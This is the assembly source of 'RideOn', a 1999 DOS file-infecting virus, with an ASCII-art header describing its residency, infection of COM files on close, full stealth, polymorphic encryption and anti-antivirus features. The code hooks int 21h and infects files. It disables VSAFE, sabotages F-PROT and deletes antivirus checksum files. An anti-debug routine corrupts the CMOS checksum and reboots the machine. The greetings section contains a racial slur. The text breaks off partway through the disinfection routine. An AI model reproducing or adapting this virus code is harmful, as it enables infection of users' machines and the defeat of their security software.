;
;  ÛÛÛÛÛÛÜ ÛÛÛÛÛÛÜ ÛÛÛÛÛÛÛ         ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿            
;  ÜÜÜ ÛÛÛ ÜÜÜ ÛÛÛ   ÜÜÜ                Virus Name:    RideOn                         
;  ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ   ÛÛÛ                Author:      ThE_WiZArD/DDT                   
;  ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ   ÛÛÛ                Origin:       Spain, 1999                    
;  ÛÛÛÛÛÛß ÛÛÛÛÛÛß   ÛÛÛ           ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ           
;
;
;
;
;      Virus Description   
;     ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;
;     (*) Residency:
;        ÄÄÄÄÄÄÄÄÄÄÄÄ
;
;        RideOn goes resident into a UMB block if available or into
;        conventional memory (MCB method) but there's no viral activity
;        if Novell Network is detected cause SFT`s don`t work.
;
;     (*) Infection:
;        ÄÄÄÄÄÄÄÄÄÄÄÄ
;
;        RideOn infects COM files using SFT`s.It uses Fast Infection
;        techniques (Infects on closing).
;        Infected files have the seconds field equal the day of the month
;        with only have a 6% chance of an invalid second fiel stamp.
;
;     (*) Stealth:
;        ÄÄÄÄÄÄÄÄÄÄ
;
;        RideOn is full-stealth, it disinfect files on Open and Debugging,
;        so the system seems to be clean.It also has FCB & DTA & TIME
;        Stealth.
;
;     (*) Armoured:
;        ÄÄÄÄÄÄÄÄÄÄÄ
;
;        RideOn has an anti-emulation routine to prevent heuristic cleans,
;        and protect its int21h from tunnelers.
;
;     (*) Retro:
;        ÄÄÄÄÄÄÄÄ
;
;        Tunneling routine using the function 52h trick.
;        Doesnt infect Anti-Virus programs and baits files (see above).
;        Disables Stealth when a compress util or F-POTATOE is running.
;        Turns off VSAFE`s flags while infecting files and restore them
;        later.
;        Breaks F-PROT's ability of detecting viruses (Thx to Wintermute)
;        Deletes CRC Checksums: anti-vir.dat, avp.crc, chklist.tav,
;        chklist.ms,ivb.ntz,smartchk.cps
;
;     (*) Anti-Bait:
;        ÄÄÄÄÄÄÄÄÄÄÄÄ
;
;        Doesnt infect files with first word equal to CD20h (int20h) ,
;        or first byte equal to 90h (NOP) (Invircible Bait Files).
;        It also skipt files with todays date , or with digits in their
;        filename (like BAIT000.COM , BAIT0001.COM ...).
;
;     (*) Polymorphism:
;        ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;        RideOn is encrypted using XOR or ADD/SUB math instructions.
;        Generated polymorphic decryptor contais fake int calls,   
;        fake int21h calls, one-two and three trash bytes routines are
;        used and also has push-pop.
;
;
;
;      Greetings: 
;      ÄÄÄÄÄÄÄÄÄÄ
;
;           MrSandman:     Keep`on witring man ... :)
;           GriYo:         Hello teacher! ;-DDD                                         
;           etumretniW:    BACKWARDS !! ;)
;           Jacky Qwerty:  Hi GOD  8-)                              
;           Tcp:           Your dissasemblies rock !
;           VirusBuster:   Dark Node forever !
;           Int13h:        Sigues sangrando a la abuela ?  X-DD
;           Darkman:       Finally here is it ! x)          
;           Reptile:       Smoking ganja rlz !!! 
;           Billy_Belceb£: A ver cuando me llamas :P          
;
;
; ... and all the DDT niggas ;)
;
;
;
; 
;     ThE_WiZArD / DDT
;   wizard555@hotmail.com
;
;
;ÄÄÄ[CUT HERE]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  
 

;/////////////////////////////////////////////////////////////////////////////
;////////////////////////////// RIDE ON //////////////////////////////////////
;/////////////////////////////////////////////////////////////////////////////

                          .286
           RIDEON         segment PARA
                          assume  CS:RIDEON,DS:RIDEON,SS:RIDEON
			  org     0h                 


rideon_size       equ   (rideon_end-rideon_start)
ride_para         equ   ((rideon_size*02h)+0Fh)/10h         
crypt_size        equ   (crypt_end-crypt_start)
size_sb           equ   (size_sin_buffer-rideon_start)

rideon_start      label  byte

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     POLYMORPHIC DECRYPTOR                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

poly_decryptor:
	    
            db    090h dup (90h)                      ;our buffer ;-)


 crypt_start label byte

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                    GET DELTA OFFSET AND FUCK DEBUGGERS                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

            call  delta_offset                   

delta_offset:
            mov   si,sp
            mov   bp,word ptr ss:[si]         
            sub   bp,offset delta_offset              ;get delta offset             
            add   sp,2

fuck_emulators:

            push  ax                                  ;anti-trace routine !
            push  -1                                  ;fuck TBCLEAN ;-)
            inc   sp
            dec   sp
            pop   ax
            inc   ax
            pop   ax
            sti
            jz    check_for_tsr 
            mov   al,2Eh                              ;CMOS: 2EH -> checksum
            out   70h,al                              ;corrupt checksum
            out   71h,al                      
            int   19h                                 ;reboot

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                CHECK FOR TSR AND NOVELL NETWORK                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

check_for_tsr:

            int   03h

            push  ds
            push  es

	    push  0db00h
            mov   cx,'OF'                             ;verify whether     
            pop   ax                                  ;NETX.EXE from novell
            int   21h                                 ;network is resident.
            or    al,al                           
            jz    novell_ok                           ;ok :)
            jmp   return_file                         ;sft`s dont work !!!

novell_ok:            
            cmp   cx,'ON'                             ;are we already 
            jne   check_date                          ;memory resident ?
            jmp   return_file

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                      GET DATE AND CHECK PAYLOAD                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

check_date:
            mov   ah,2bh                              ;get date
	    dec   ah                                
	    int   21h
            mov   byte ptr cs:[today][bp],dl          ;save today`s date !!
	      
            cmp   dh,07h                              ;month 7 ? 
            jne   go_tsr        
            cmp   dl,04h                              ;day 4 ?
            jne   go_tsr        
            jmp   payload                             ;go to PAYLOAD !!
						 

rideon_lives db '#ThE_WiZArD'                         ;of course ;)

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                 GO TSR INTO UMB`s AND TUNNEL INT 21H                     ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

go_tsr:
            mov   al,21h                              ;get int21h
            call  get_int
	    
            mov   word ptr cs:[oldInt21h][bp],bx      ;save int21h
            mov   word ptr cs:[oldInt21h+02h][bp],es
            mov   word ptr cs:[tunnel21h][bp],bx      ;tunneling int21h
            mov   word ptr cs:[tunnel21h+02h][bp],es
	    
	    xor   di,di                               ;DI=0
	       
            mov   ah,52h                              ;get pointer to DIB 
            int   21h                                 ;try to get int21h
	       
	    push  bx

            mov   bx,109Eh                            ;kernel entry point
            cmp   word ptr es:[bx],9090h              ;double NOP
            jne   no_trick                           
            cmp   byte ptr es:[bx+02h],0E8h           ;call xxx
            jne   no_trick    
            cmp   word ptr es:[bx+05h],0FF2Eh         ;jmp dword xxx
            jne   no_trick    
	    
            mov   word ptr cs:[tunnel21h][bp],bx      ;tunneling int21h
            mov   word ptr cs:[tunnel21h+02h][bp],es

no_trick:   
	    pop   bx

inst_umb:   
            lds   si,es:[bx+12h]                      ;get pointer to the 
                                                      ;DOS buffers structure
	       
            mov   ax,ds:[si+1Fh]                      ;get address of first 
	    cmp   ax,0FFFFh                           ;UMB
            je    no_umbs

nextumb:        
	    mov   ds,ax
	       
            cmp   word ptr ds:[di+01h],di             ;check for free UMB`s
	    jnz   no_free_umb
	       
            cmp   word ptr ds:[di+03h],ride_para+01h  ;is there enought 
	    ja    handle_mcb                          ;size?

no_free_umb:
            cmp   byte ptr ds:[di+00h],"Z"            ;is the last UMB ?
	    je    no_umbs
	       
	    mov   ax,ds
	    inc   ax
            add   ax,word ptr ds:[di+03h]             ;jump to the next UMB
	    mov   ds,ax
	    jmp   short nextumb

no_umbs:
            mov   ah,52h                              ;get pointer to DIB
	    int   21h
	      
            mov   ax,es                               ;get pointer to first 
	    dec   ax                                  ;MCB
	    mov   es,ax
	    add   bx,12
	    lds   di,dword ptr es:[bx+00h]

nextmcb:
            cmp   byte ptr ds:[di+00h],"Z"            ;is the last MCB ?
	    je    ok_mcb
	      
	    mov   ax,ds
	    inc   ax
            add   ax,word ptr ds:[di+03h]             ;jump to the next MCB
	    mov   ds,ax
	    jmp   short nextmcb

ok_mcb:
            cmp   word ptr ds:[di+03h],ride_para+4000h ;check MCB size !
	    ja    ok_mcb_size
            jmp   return_file

ok_mcb_size:        
            sub   word ptr ds:[di+12h],ride_para+01h  ;sub our size in PSP

handle_mcb:
            sub   word ptr ds:[di+03h],ride_para+01h  ;sub our size and MCB 
						      ;size

            mov   byte ptr ds:[di+00h],"M"            ;clear the last MCB 
						      ;field
	    mov   ax,ds
	    inc   ax
            add   ax,word ptr ds:[di+03h]             ;jump to next MCB
	    mov   es,ax
	    inc   ax
	    push  ax
	    
            mov   byte ptr es:[di],"Z"                ;mark MCB as last
            mov   word ptr es:[di+1h],8h              ;owner by DOS
            mov   word ptr es:[di+3h],((rideon_size/10)+1) ;MCB size
	    
            mov   word ptr es:[di+8],4f44h            ;mark block as owned
	    mov   word ptr es:[di+0ah],0053h          ;by DOS (444f53h,0)
	    
	    cld
	    pop   es
	    mov   ax,cs
	    mov   ds,ax
	    xor   di,di
            mov   si,bp                      
            mov   cx,rideon_size/2+1                  ;our size 
            rep   movsw                               ;go to mem !

set_int21h:        
	    push  es
	    pop   ds
	    
	    mov   al,21h
            mov   dx, offset int21h_rideon 
            call  Set_Int                             ;set new int21h

return_file: 
            pop   es                                  ;restore ES & DS
            pop   ds

	    mov   bx,bp
	       
exit_com:      
            lea   si,orig_header                      ;SI points to original 
	    add   si,bx                               ;start
	    mov   di,101h
	    dec   di
            push  di                                  ;return to main program 
            movsw                                     ;restore the header      
	    movsw                                     

	    xor   ax,ax
            sub   bx,bx                               ;set registers to 0
	    xor   cx,cx
	    sub   dx,dx
	    xor   di,di
	    xor   si,si
	    sub   bp,bp
	     
	    ret
		

orig_header    db      0CDh,020h,90h,01h              ;original 4 bytes

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                            FCB STEALTH                                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

fcb_stealth:
	    pop   ax
	    pop   si

	    pushf                              
            call  dword ptr cs:[oldInt21h]            ;call to INT 21h
            test  al,al                               ;error ?
            jnz   fcb_out                             ;Jump if error
		
            call  push_all                            ;save registers
		
            mov   ah,51h                              ;get current psp
            pushf
            call  dword ptr cs:[oldInt21h]            ;call to INT 21h

            mov   es,bx                               ;es=segment of psp
	    cmp   bx,es:[16h]                         ;PSP of COMMAND.COM?
	    jnz   fcb_out1                            
	    mov   bx,dx                               ;DS:BX=FCB
	    mov   al,[bx]                             
	    push  ax                                  

            mov   ah,2fh                              ;get DTA in ES:BX
            pushf
            call  dword ptr cs:[oldInt21h]            ;call to INT 21h
	    
            pop   ax                                  ;get first byte
	    inc   al                                  ;al=ffh therefor al=ZR
	    jnz   fcb_old                             ;if != ZR jmp
            add   bx,7h                               ;extended fcb here, +7

fcb_old:       
	    cmp   word ptr es:[bx+09h],'OC'           ;It`s a .COM file ?
            jne   fcb_out1
	    
check_st:   
            mov   ax,es:[bx+17h]                      ;get file time stamp
            mov   cx,es:[bx+19h]                      ;get file date stamp
            and   ax,1fh                              ;unmask seconds field
            and   cx,1fh                              ;unmask day of month
            xor   ax,cx                               ;are they equal?
            jnz   fcb_out1                            ;nope, exit ...  
            sub   word ptr es:[bx+1dh],size_sb        ;sub away virus_size
            sbb   word ptr es:[bx+1fh],0              ;sub with carry flag

fcb_out1:   
            call  pop_all                             ;restore registers

fcb_out:       
            iret                                      ;return control

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                          HANDLE STEALTH                                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

handle_stealth:
	    pop   ax
	    pop   si
	    
	    pushf                             
            call  dword ptr cs:[oldInt21h]            ;call to INT 21h
            jnc   handle_ok

	    stc
	    retf  02h
handle_ok:
            call  push_all                            ;push this shit !
	    
	    call  get_env

            cmp   ax,"-F"                             ;f-prot 
	    jz    not_infected
	    
            cmp   ax,"RA"                             ;arj
	    jz    not_infected
	    
            cmp   ax,"AR"                             ;rar
	    je    not_infected
	    
            cmp   ax,"KP"                             ;pk*
	    je    not_infected
	    
            cmp   ax,"HL"                             ;lha
	    je    not_infected
	    
            cmp   ax,"AB"                             ;backup
	    je    not_infected
	    
	    mov   ah,2Fh                              ;get DTA
	    pushf                             
            call  dword ptr cs:[OldInt21h]            ;call to INT 21h

            mov   ax,es:[bx+16h]                      ;get file time stamp
            mov   cx,es:[bx+18h]                      ;get file date stamp
            and   ax,1fh                              ;unmask seconds field
            and   cx,1fh                              ;unmask day of month
            cmp   ax,cx                               ;are they equal
	    jne   not_infected   

	    cmp   ax,1eh
            jb    hnd_sub 
		
            and   byte ptr es:[bx+16h],0E0h           ;erase erroneous sec.
	    
hnd_sub:        
            sub   word ptr es:[bx+1Ah],size_sb        ;sub virus size
            sbb   word ptr es:[bx+1ch],0              ;sub with carry flag
	    
not_infected:    
	    call  pop_all
	    retf  02h

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                  MAKE F-PROT DOESNT DETECT ANY VIRUS                     ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
              
fuck_fprot: 
            pop   ax
            pop   si

            call  push_all
	    cmp   al,1
            jz    exit_read 
	    cmp   bx,8
            jnz   exit_read 
	    
	    call  get_env

            cmp   ax,"-F"                               ;f-prot ?
            jnz   exit_read    
	    
	    call  pop_all

	    pushf
            call    dword ptr cs:[oldint21h]    
	    call    push_all                 
	    push    ds dx   
            pop     di es                               ;send interrupt
	    xor     si,si                               ;vector table
	    mov     ds,si   
	    rep     movsb

            call    pop_all                             ;quo vadis Fridrik ?
	    retf    2

exit_read: 
	    call    pop_all
            jmp     exitint21h 


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                         NEW INTERRUPT 21h                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

            DB 'You`ll take my life but iïll take yours too'

int21h_rideon:     
	    cli                    
            push ax                                   ;anti-tunneling routine         
            push -1                                 
	    inc  sp
	    dec  sp
	    pop  ax
	    inc  ax
	    pop  ax
	    sti
            jz   int21h_tsr                           ;kaspersky anybody
	    iret                                      ;home ? :-P
						    
int21h_tsr:            
	    cmp   ax,0db00h                              
            jne   int21h_checks
	    cmp   cx,'OF'                             ;ride OFF ? 
            jne   int21h_checks

	    mov   cx,'ON'                             ;ride .. ON !! ;)
            iret


int21h_checks:   
	    push  si
	    push  ax
	    
            mov   si,offset rideon_table              ;SI=jump table.
	    cld

check_functions:   
            cmp   si,offset end_table                 ;end of table...
            je    nothing_to_do
	    db    2eh                                 ;CS:
	    lodsb
            cmp   ah,al                               ;do the functions
            je    Come_on                             ;match ?
	    inc   si                                                         
	    inc   si                              
            jmp   check_functions     

come_on:
	    db    2eh                                 ;CS:
	    lodsw
            jmp   ax                                  ;let`s go !

nothing_to_do:
	    jmp   end_table

rideon_Table:  
            db    11h                                 ;fcb stealth
            dw    offset fcb_stealth                   
            db    12h                               
            dw    offset fcb_stealth                   
            db    4eh                                 ;handle stealth
            dw    offset handle_stealth                
            db    4fh                               
            dw    offset handle_stealth                
            db    57h                                 ;seconds stealth
            dw    offset stealth_seconds               
            db    4bh                                 ;fuck avs   
            dw    offset delete_crc  
            db    3fh                                 ;read   
            dw    offset fuck_fprot       
            db    3dh                                 ;open
            dw    offset disinfect_file
            db    6ch                                 ;ext. open
            dw    offset disinfect_file                   
            db    3eh                                 ;close        
            dw    offset infect_3Eh    

end_table:
            pop   ax                                  ;restore and exit !
	    pop   si


exitint21h: 
	    db    0eah
oldint21h   dw    ?,?                                 ;old Int 21h

exittun21h: db    0eah                                ;original Int 21h       
tunnel21h   dw    ?,?
	    

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                        DATE/TIME STEALTH                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

stealth_seconds:
	    pop   ax
	    pop   si
	    
            cmp   al,00h                              ;hide wrong secs
            je    stealth_seconds1                  
            cmp   al,01h                              ;protect wrong secs
            je    stealth_seconds2

exit_seconds:
            iret

stealth_seconds1:
	    pushf
            call  dword ptr cs:[oldInt21h]            ;do the real int
	    push  cx
            and   cx,1fh                              ;unmask second field
            and   dx,1fh                              ;unmask date field
            xor   cx,dx                               ;are they equal?
            jnz   seconds1_exit                             
            cmp   cx,1fh                              ;erroneus seconds ?
            jb    seconds1_exit
	    pop   cx                                        
            and   cl,11100000b                        ;erase erronous infect 
	    or    cl,1                                ;mark
	    push  cx
	  
seconds1_exit:
            pop   cx                                  ;restore
            iret                                      ;exit

stealth_seconds2:
	
	    push  dx
            push  cx                                  ;saves originals
            mov   ax,5700h                            ;get DATE/TIME
	    pushf
            call  dword ptr cs:[oldInt21h]
            and   cx,1fh                              ;unmask second field
            and   dx,1fh                              ;unmask date field
            xor   cx,dx                               ;are they equal?
            jne   seconds2_exit
	    pop   cx
	    pop   dx
            and   cx,0ffe0h                           ;reset second bits
            or    cx,dx                               ;seconds=day of month
	    push  dx
	    push  cx

seconds2_exit:
	    pop   cx
	    pop   dx
            mov   ax,5700h                            ;set DATE/TIME
	    inc   ax
	    pushf
            call  dword ptr cs:[oldInt21h]
            iret                                      ;exit ...


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                        ROUTINE TO INFECT                                 ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

infect_3eh:      
	    pop   ax
	    pop   si
	       
            cmp   bx,4h                               ;handle > 4                   
            ja    close_ok                            ;if YES ,then JUMP!           
closing_bye:    
            jmp   exitint21h                          ;leave ...
	    
close_ok:              
            call  push_all                            ;save all 

            call  disable_kb                          ;turn OFF keyboard
            call  set_int24h                          ;set new int24h
	    
            call  vsafe_off                           ;turn OFF vshit
	    
	    mov   ah,45h
            call  call_tun21h                         ;duplicate handle
            jnc   close_cont

salir:      jmp   exit    

close_cont:   
	    xchg  bx,ax
	    push  ax
	       
            mov   ah,3Eh                              ;close new handle in
            call  call_tun21h                         ;order to update 
	    pop   bx                                  ;directory entry

            call  get_sft                             ;get sft
	    jc    Salir                                                                  
	    
check_com:  
            cmp   word ptr es:[di+28h],'OC'           ;it is a .COM file ?
            jnz   salir      
	    
check_size: 
            cmp   word ptr es:[di+11h],0EE48h         ;it is > 61k ?
            ja    salir                            

		  
check_inf:  
            call  check_infect                        ;it is infected ?
	    jc    salir
						     
            and   word ptr cs:[old_time],0ffe0h       ;reset second bits
            or    word ptr cs:[old_time],dx           ;seconds=day of month

chk_date:            
            mov   al,byte ptr es:[di+0Fh]             ;do not infect files
            and   al,1Fh                              ;with todays date
	    cmp   al,byte ptr cs:[today]
            je    salir  

	    mov   cx,0Bh
	    mov   si,di
check_0&9:
            cmp   byte ptr es:[si+20h],"0"            ;do not infect files
            jb    check_command                       ;with numbers in their
	    cmp   byte ptr es:[si+20h],"9"            ;name
            jbe   salir     
	    inc   si
            loop  check_0&9
	    
check_command:                                         
            cmp   ax,'OC'                             ;dont infect 
            jz    salir                               ;COMMAND.COM
	    
save_stuff:
            mov   cx,2h                               ;save and set file
	    xchg  cx,word ptr es:[di+02h]             ;open mode (R/W)
	    push  cx
	    
            xor   al,al                               ;save and set file
	    xchg  al,byte ptr es:[di+04h]             ;atribute 
	    push  ax

            push   word ptr es:[di+15h]               ;save file pointer
	    push   word ptr es:[di+17h]               ;position
	    
	    push  cs                                                    
	    pop   ds                                  ;CS=DS          
	    
            call  get_key16                           ;get encryption key

read_header:
            call  lseek_start
	    
	    mov   ah,3fh
            mov   cx,04h
            lea   dx,header                           ;read first 04h bytes
            call  call_tun21h
            jnc   copy_header
            jmp   restore

copy_header:         
            push  di si es cs                         ;save stuff
	    pop   es                                  ;CS=ES
	    
            mov si,offset header
            mov di,offset orig_header
            mov cx,0004h
	    cld
            rep movsb                                 ;copy header to buffer
	    
	    pop   es si di
	    
            mov   cx,word ptr cs:[header+00h]
            add   cl,ch                               ;add markers M+Z
            cmp   cl,"Z"+"M"                          ;it`s an .EXE file ?
            je    restore    

infect_com: 
            cmp   word ptr cs:[header+00h],20CDh      ;int20h instruction ?
            jz    restore                             ;exit !
            cmp   byte ptr cs:[header+00h],90h        ;invircible bait?
            jz    restore                             ;exit !
	    
            call  lseek_end
	    
            mov   delta_ofs,ax                        ;store delta offset
	    add   delta_ofs,100h
	    
	    sub   ax,3h
            mov   word ptr cs:[jump_address+1],ax     ;set the JMP address

	   
            call  push_all                            ;save stuff
            push  cs
            pop   es                                  ;CS=ES

            call  choose_math                         ;XOR , ADD or SUB
            call  polymorphic                         ;changue my face plz !
            call  encryption                          ;copy & encrypt virus :)

            call  pop_all

            call  lseek_end
	    
            mov   ah,3Fh                              ;write Virus
	    inc   ah
            lea   dx,buffer                           ;encrypted virus
            mov   cx,size_sb                          ;virus size
            call  call_tun21h
            jc    restore   
	    
            call  lseek_start
	    
	    mov   ah,3Fh
	    inc   ah
            lea   dx,jump_address                     ;write JMP
	    mov   cx,4h                                                 
            call  call_tun21h                                         

restore:                                                                    
            pop   word ptr es:[di+17h]                ;restore file pointer
	    pop   word ptr es:[di+15h]                ;position
	    
            pop   ax                                  ;restore file 
	    mov   byte ptr es:[di+04h],al             ;atribute
	    
            pop   cx                                  ;restore file open
	    mov   word ptr es:[di+02h],cx             ;mode
	    
            call  res_stuff

exit:        
            lds   dx,dword ptr cs:[OldInt24h]         ;restore old int24h 
	    mov   al,24h                              
	    call  set_int
	    
            call  vsafe_on                            ;turn ON vshit
            call  enable_kb                           ;turn ON keyboard

            call  pop_all                             ;restore all
	    
            jmp   exitint21h                          ;exit ... 

	   

jump_address db   0E9h,90h,90,0Bh                     ;jmp address                    
	    
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                         DISINFECTION ROUTINE                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

disinfect_file:
	    pop   ax
	    pop   si
		  
	    call  push_all

            cmp   ax,6c00h                            ;extended open ?
	    jz    extended
	    mov   si,dx                               
extended:
	    mov   di,ds

            call  disable_kb                          ;turn OFF keyboard
            call  set_int24h                          ;set our int24h

            call  vsafe_off                           ;turn OFF vshit
	    
open_dsf:   
            mov   ds,di                               ;open the file 
	    mov   dx,si                              
	    xor   cx,cx
	    mov   ax,3D00h
            call  call_tun21h
            jnc   open_ok     
            jmp   exit_res24h

open_ok:    
	    xchg  ax,bx
            call  get_sft                             ;get SFT
            jc    error_dsf  

            cmp   word ptr es:[di+28h],'OC'           ;it is a .COM file ?
            jnz   error_dsf  
	    
check_inff:  
            call  check_infect                        ;is it infected ?
            jc    save_this    

error_dsf:  
            jmp   exit_close 

save_this:             
            mov   cx,2h                               ;save and set file
	    xchg  cx,word ptr es:[di+02h]             ;open mode (R/W)
	    push  cx
	    
            xor   al,al                               ;save and set file
	    xchg  al,byte ptr es:[di+04h]             ;atribute 
	    push  ax

            push   word ptr es:[di+15h]               ;save file pointer
	    push   word ptr es:[di+17h]               ;position
	    
            push  cs                                  ;is it infected ?
	    pop   ds
	   
            call  lseek_start
	    
	    mov   ah,3fh
	    mov   cx,4h
            lea   dx,header                           ;read first 4 bytes
            call  call_tun21h
            jc    rest_all
	    
